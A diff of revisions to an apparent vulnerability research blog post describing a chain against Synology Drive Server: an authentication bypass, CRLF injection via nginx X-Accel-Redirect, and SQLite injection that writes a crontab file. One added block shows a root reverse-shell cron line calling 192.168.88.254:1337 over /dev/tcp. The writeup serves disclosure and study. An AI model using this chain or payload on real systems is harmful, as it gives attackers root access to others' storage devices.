@@ -17,7 +17,7 @@ However, two weeks ago, I stumbled upon a [tweet from b33f](https://x.com/FuzzyS
 
 ![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/disappointed-face-palm.gif" | relative_url}})
 
-**But here is the twist.** While comparing our approaches, I noticed that my path to Remote Code Execution (RCE) deviated from the original research.
+**But here is the twist!** While comparing our approaches, I noticed that my path to Remote Code Execution (RCE) deviated from the original research.
 
 Rather than a completely new discovery, I had identified a simple universal application of the SQLite "Dirty File Write" primitive. I verified SQLite Injection to target the **crontab**, establishing a reliable RCE vector specifically for PHP-free environments—a scenario lacking published universal technique.
 
@@ -85,6 +85,8 @@ The `syncd` daemon is the core of Synology Drive Server package. It listens on t
 
 Although the protocol supports encryption, it can be disabled via the Desktop App settings. Alternatively, cleartext traffic can be captured by sniffing the Unix Domain Socket. Below is a captured packet dump:
 
+_File: `/usr/syno/synoman/webapi/SYNO.API.Auth.lib`_
+
 ```
 00000000: 25 52 18 14 46 12 00 00  42 10 00 06 40 70 72 6F  %R..F...B...@pro
 00000010: 74 6F 42 10 00 0D 62 6F  64 79 2D 63 6F 6E 74 69  toB...body-conti
@@ -103,7 +105,7 @@ Although the protocol supports encryption, it can be disabled via the Desktop Ap
 
 The first vulnerability stems from a logical flaw in how `syncd` handles authentication requests from various channels (`webapi` vs TCP:6690).
 
-Analysis began by examining the patch for [Synology Drive Server 3.5.1-26102](https://archive.synology.com/download/Package/SynologyDrive/3.5.1-26102). A comparison of `webapi/drive/SYNO.SynologyDrive.lib` reveals the removal of the `authenticate` method from the `SYNO.SynologyDrive.Authentication` endpoint:
+Analysis began by examining the patch for [Synology Drive Server 3.5.1-26102](https://archive.synology.com/download/Package/SynologyDrive/3.5.1-26102). A comparison of `SYNO.SynologyDrive.lib` reveals the removal of the `authenticate` method from the `SYNO.SynologyDrive.Authentication` endpoint:
 
 ```diff
     "SYNO.SynologyDrive.Authentication": {
@@ -224,7 +226,7 @@ I examined the incremental patches for [DSM 7.2.2-72806-1](https://archive.synol
 
 ![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50629_patch.png" | relative_url}})
 
-Within `webapi/SYNO.API.Auth.so`, `SYNO::auth_redirect_uri_run` function changed. The patch introduced explicit validation to reject Carriage Return (`\r`) and Line Feed (`\n`) characters in the `redirect_url` parameter:
+Within `SYNO.API.Auth.so`, `SYNO::auth_redirect_uri_run` function changed. The patch introduced explicit validation to reject Carriage Return (`\r`) and Line Feed (`\n`) characters in the `redirect_url` parameter:
 
 ```diff
 unsigned __int64 __fastcall SYNO::auth_redirect_uri_run(SYNO *this, SYNO::APIRequest *a2, SYNO::APIResponse *a3) {
@@ -267,8 +269,16 @@ To weaponize this CRLF Injection in `nginx` environment, the `X-Accel-Redirect` 
 
 As noted in prior research by [Justin Taft](https://justintaft.com/blog/cve-2021-29084-synology-crlf-unauthenticated-file-downloads), the `/volume1/` directory is accessible via an internal alias, providing access to application data or system files:
 
+_File: `/etc/nginx/nginx.conf`_
+
 ```
-location ~ ^/volume(?:X|USB|SATA|Gluster)?\d+/ {
+ server {
+
+        listen 80;
+        listen [::]:80;
+        ...
+
+        location ~ ^/volume(?:X|USB|SATA|Gluster)?\d+/ {
             internal;
             root /;
             open_file_cache off;
@@ -329,6 +339,8 @@ DELETE FROM enable_sharing_table;
 ```
 
 Injecting a double quote (e.g.: `";foo`) breaks the query syntax, verifying the SQLite Injection:
+
+_File: `/volume1/@synologydrive/log/syncfolder.log`_
 
 ```
 2025-11-30T16:04:06 (14186:80224) [ERROR] sqlite_engine.cpp.o(155): sqlite3_exec error: near "foo": syntax error (1) sql = UPDATE setting_table SET sharing_level = 0,sharing_internal_level = 0,sharing_force_selected = 0,sharing_force_password = 0,sharing_force_expiration = 0,default_enable_full_content_indexing = 0,force_https_sharing_link = 0,enable_sharing_link_customization = 1,sharing_link_customization = "";foo",sharing_link_fully_custom_url = "",default_displayname = 0,enable_c2share_offload = 0,sharing_link_by_email = 0; DELETE FROM enable_sharing_table;
@@ -417,6 +429,14 @@ Upon execution, the created file `/etc/cron.d/pwn.task` contains a mix of binary
 
 ![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/exploit_pwn_task.png" | relative_url}})
 _Red: New Line(`\n`), Blue: Crontab Line_
+
+When viewed as text, the file appears as:
+
+```bash
+$ cat /etc/cron.d/pwn.task
+��@�tabletabtabCREATE TABLE tab (dataz text)
+* * * * * root bash -i >& /dev/tcp/192.168.88.254/1337 0>&1
+```
 
 When `cron` parses this file, it discards the SQLite binary headers as invalid line and executes only the valid crontab line—giving us a `root` reverse shell:
 
